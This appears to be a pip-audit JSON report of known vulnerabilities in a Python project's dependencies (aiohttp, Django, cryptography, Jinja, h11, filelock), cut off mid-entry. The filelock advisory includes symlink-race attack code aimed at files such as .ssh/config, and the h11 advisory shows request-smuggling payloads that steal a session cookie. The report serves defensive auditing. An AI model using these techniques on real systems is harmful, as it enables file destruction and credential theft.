{
  "repo": "D:\\code\\PythonWithPycharm\\DataMining\\code_assistant\\my_repo",
  "findings": [
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-27306 ### Summary  A XSS vulnerability exists on index pages for static file handling.  ### Details  When using `web.static(..., show_index=True)`, the resulting index pages do not escape file names.  If users can upload files with arbitrary filenames to the static directory, the server is vulnerable to XSS attacks.  ### Workaround  We have always recommended using a reverse proxy server (e.g. nginx) for serving static files. Users following the recommendation are unaffected.  Other users can disable `show_index` if unable to upgrade.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8319/files",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.9.4"
        ],
        "aliases": [
          "GHSA-7gpw-8wmc-pm8g"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-30251 ### Summary An attacker can send a specially crafted POST (multipart/form-data) request. When the aiohttp server processes it, the server will enter an infinite loop and be unable to process any further requests.  ### Impact An attacker can stop the application from serving requests after sending a single request.  -------  For anyone needing to patch older versions of aiohttp, the minimum diff needed to resolve the issue is (located in `_read_chunk_from_length()`):  ```diff diff --git a/aiohttp/multipart.py b/aiohttp/multipart.py index 227be605c..71fc2654a 100644 --- a/aiohttp/multipart.py +++ b/aiohttp/multipart.py @@ -338,6 +338,8 @@ class BodyPartReader:          assert self._length is not None, \"Content-Length required for chunked read\"          chunk_size = min(size, self._length - self._read_bytes)          chunk = await self._content.read(chunk_size) +        if self._content.at_eof(): +            self._at_eof = True          return chunk        async def _read_chunk_from_stream(self, size: int) -> bytes: ```  This does however introduce some very minor issues with handling form data. So, if possible, it would be recommended to also backport the changes in: https://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19 https://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597 https://github.com/aio-libs/aiohttp/commit/f21c6f2ca512a026ce7f0f6c6311f62d6a638866",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.9.4"
        ],
        "aliases": [
          "GHSA-5m98-qgg9-wh84"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-52304 ### Summary The Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.10.11"
        ],
        "aliases": [
          "GHSA-8495-4g3g-x7pr"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-53643 ### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.12.14"
        ],
        "aliases": [
          "GHSA-9548-qrrj-x5pj"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-6176 Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "1.2.0"
        ],
        "aliases": [
          "GHSA-2qfp-q593-8484"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-225 cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Starting in version 38.0.0 and prior to version 42.0.4, if `pkcs12.serialize_key_and_certificates` is called with both a certificate whose public key did not match the provided private key and an `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`, then a NULL pointer dereference would occur, crashing the Python process. This has been resolved in version 42.0.4, the first version in which a `ValueError` is properly raised.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "42.0.4"
        ],
        "aliases": [
          "GHSA-6vqw-3v5j-54x4",
          "CVE-2024-26130"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> GHSA-h4gh-qq45-vh27 pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "43.0.1"
        ],
        "aliases": []
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-12797 pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 42.0.0-44.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20250211.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "44.0.1"
        ],
        "aliases": [
          "GHSA-79v4-65xg-pq4g"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-58 An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. Derived classes of the django.core.files.storage.Storage base class, when they override generate_filename() without replicating the file-path validations from the parent class, potentially allow directory traversal via certain inputs during a save() call. (Built-in Storage sub-classes are unaffected.)",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.14",
          "5.0.7"
        ],
        "aliases": [
          "GHSA-9jmf-237g-qf46",
          "CVE-2024-39330"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-57 An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. The django.contrib.auth.backends.ModelBackend.authenticate() method allows remote attackers to enumerate users via a timing attack involving login requests for users with an unusable password.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.14",
          "5.0.7"
        ],
        "aliases": [
          "GHSA-x7q2-wr7g-xqmf",
          "CVE-2024-39329"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-56 An issue was discovered in Django 4.2 before 4.2.14 and 5.0 before 5.0.7. urlize and urlizetrunc were subject to a potential denial of service attack via certain inputs with a very large number of brackets.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.14",
          "5.0.7"
        ],
        "aliases": [
          "GHSA-qg2p-9jwr-mmqf",
          "CVE-2024-38875"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-59 An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. get_supported_language_variant() was subject to a potential denial-of-service attack when used with very long strings containing specific characters.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.14",
          "5.0.7"
        ],
        "aliases": [
          "GHSA-f6f8-9mx6-9mx2",
          "CVE-2024-39614"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-69 An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.15",
          "5.0.8"
        ],
        "aliases": [
          "CVE-2024-41991",
          "GHSA-r836-hh6v-rg5g"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-70 An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.15",
          "5.0.8"
        ],
        "aliases": [
          "GHSA-pv4p-cwwg-4rph",
          "CVE-2024-42005"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-68 An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.15",
          "5.0.8"
        ],
        "aliases": [
          "GHSA-795c-9xpc-xw6g",
          "CVE-2024-41990"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-67 An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The floatformat template filter is subject to significant memory consumption when given a string representation of a number in scientific notation with a large exponent.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.15",
          "5.0.8"
        ],
        "aliases": [
          "CVE-2024-41989",
          "GHSA-jh75-99hh-qvx9"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2025-13 An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.20",
          "5.0.13",
          "5.1.7"
        ],
        "aliases": [
          "GHSA-p3fp-8748-vqfq",
          "CVE-2025-26699"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-102 An issue was discovered in Django 5.1 before 5.1.1, 5.0 before 5.0.9, and 4.2 before 4.2.16. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.16",
          "5.0.9",
          "5.1.1"
        ],
        "aliases": [
          "CVE-2024-45230",
          "GHSA-5hgc-2vfp-mqvc"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-157 An issue was discovered in Django 5.1 before 5.1.4, 5.0 before 5.0.10, and 4.2 before 4.2.17. Direct usage of the django.db.models.fields.json.HasKey lookup, when an Oracle database is used, is subject to SQL injection if untrusted data is used as an lhs value. (Applications that use the jsonfield.has_key lookup via __ are unaffected.)",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.17",
          "5.0.10",
          "5.1.4"
        ],
        "aliases": [
          "CVE-2024-53908",
          "GHSA-m9g8-fxxm-xg86"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-156 An issue was discovered in Django 5.1 before 5.1.4, 5.0 before 5.0.10, and 4.2 before 4.2.17. The strip_tags() method and striptags template filter are subject to a potential denial-of-service attack via certain inputs containing large sequences of nested incomplete HTML entities.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.17",
          "5.0.10",
          "5.1.4"
        ],
        "aliases": [
          "GHSA-8498-2h75-472j",
          "CVE-2024-53907"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2025-1 An issue was discovered in Django 5.1 before 5.1.5, 5.0 before 5.0.11, and 4.2 before 4.2.18. Lack of upper-bound limit enforcement in strings passed when performing IPv6 validation could lead to a potential denial-of-service attack. The undocumented and private functions clean_ipv6_address and is_valid_ipv6_address are vulnerable, as is the django.forms.GenericIPAddressField form field. (The django.db.models.GenericIPAddressField model field is not affected.)",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.18",
          "5.0.11",
          "5.1.5"
        ],
        "aliases": [
          "GHSA-qcgg-j2x8-h9g8",
          "CVE-2024-56374"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2025-14 An issue was discovered in Django 5.1 before 5.1.8 and 5.0 before 5.0.14. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.views.LoginView, django.contrib.auth.views.LogoutView, and django.views.i18n.set_language are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "5.0.14",
          "5.1.8"
        ],
        "aliases": [
          "CVE-2025-27556",
          "GHSA-wqfg-m96j-85vm"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-45231 An issue was discovered in Django v5.1.1, v5.0.9, and v4.2.16. The django.contrib.auth.forms.PasswordResetForm class, when used in a view implementing password reset flows, allows remote attackers to enumerate user e-mail addresses by sending password reset requests and observing the outcome (only when e-mail sending is consistently failing).",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.16",
          "5.0.9",
          "5.1.1"
        ],
        "aliases": [
          "GHSA-rrqc-c2jx-6jgv"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-48432 An issue was discovered in Django 5.2 before 5.2.2, 5.1 before 5.1.10, and 4.2 before 4.2.22. Internal HTTP response logging does not escape request.path, which allows remote attackers to potentially manipulate log output via crafted URLs. This may lead to log injection or forgery when logs are viewed in terminals or processed by external systems.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.22",
          "5.1.10",
          "5.2.2"
        ],
        "aliases": [
          "GHSA-7xr5-9hcq-chf9"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-57833 An issue was discovered in Django 4.2 before 4.2.24, 5.1 before 5.1.12, and 5.2 before 5.2.6. FilteredRelation is subject to SQL injection in column aliases, using a suitably crafted dictionary, with dictionary expansion, as the **kwargs passed QuerySet.annotate() or QuerySet.alias().",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.24",
          "5.1.12",
          "5.2.6"
        ],
        "aliases": [
          "GHSA-6w2r-r2m5-xq5w"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-64458 An issue was discovered in 5.1 before 5.1.14, 4.2 before 4.2.26, and 5.2 before 5.2.8. NFKC normalization in Python is slow on Windows. As a consequence, `django.http.HttpResponseRedirect`, `django.http.HttpResponsePermanentRedirect`, and the shortcut `django.shortcuts.redirect`  were subject to a potential  denial-of-service attack via certain inputs with a very large number of Unicode characters. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Seokchan Yoon for reporting this issue.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.26",
          "5.1.14",
          "5.2.8"
        ],
        "aliases": [
          "GHSA-qw25-v68c-qjf3"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-64459 An issue was discovered in 5.1 before 5.1.14, 4.2 before 4.2.26, and 5.2 before 5.2.8. The methods `QuerySet.filter()`, `QuerySet.exclude()`, and `QuerySet.get()`, and the class `Q()`, are subject to SQL injection when using a suitably crafted dictionary, with dictionary expansion, as the `_connector` argument. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank cyberstan for reporting this issue.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "4.2.26",
          "5.1.14",
          "5.2.8"
        ],
        "aliases": [
          "GHSA-frmv-pr5f-9mcr"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-68146 ### Impact  A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks. The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? → False T1                                             ↓ RACE WINDOW T2                                             Create symlink: lock → victim_file T3      Open lock_file with O_TRUNC         → Follows symlink         → Opens victim_file         → Truncates victim_file to 0 bytes! ☠️ ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable? T1                                             ↓ RACE WINDOW T2                                             Create symlink: lock → victim_file T3      Open lock_file with O_TRUNC         → Follows symlink/junction         → Opens victim_file         → Truncates victim_file to 0 bytes! ☠️ ```  ### Step-by-Step Attack Flow  **1. Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} → {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # ← VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // ← Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # ← Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.20.1"
        ],
        "aliases": [
          "GHSA-w853-jp5j-5j7f"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-43859 ### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "0.16.0"
        ],
        "aliases": [
          "GHSA-vqfr-h8mv-ghfj"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> PYSEC-2024-60 A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulnerability is triggered by a crafted input that causes the `idna.encode()` function to process the input with considerable computational load, significantly increasing the processing time in a quadratic manner relative to the input size.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.7"
        ],
        "aliases": [
          "GHSA-jjg7-2v4v-x38h",
          "CVE-2024-3651"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-34064 The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.  Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.1.4"
        ],
        "aliases": [
          "GHSA-h75v-3vvj-5mfj"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-56326 An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.1.5"
        ],
        "aliases": [
          "GHSA-q2x7-8rv6-6q7h"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-56201 A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.  To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.1.5"
        ],
        "aliases": [
          "GHSA-gmj6-6f8f-6699"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
